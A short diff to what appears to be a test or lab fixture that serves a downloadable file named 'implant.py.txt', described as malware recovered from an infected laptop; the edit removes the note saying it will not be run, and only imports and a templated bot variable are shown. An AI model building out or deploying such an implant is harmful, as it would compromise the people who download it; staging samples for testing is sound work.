@@ -16,7 +16,7 @@ path = "/dl/implant.py.txt"
 status = 200
 content_type = "text/plain; charset=utf-8"
 headers = { "content-disposition" = 'attachment; filename="implant.py.txt"' }
-body = '''# implant.py - recovered from an infected laptop (renamed, will not be run)
+body = '''# implant.py - recovered from an infected laptop
 import base64, json, time, urllib.request
 
 BOT = "{{d:bot}}"
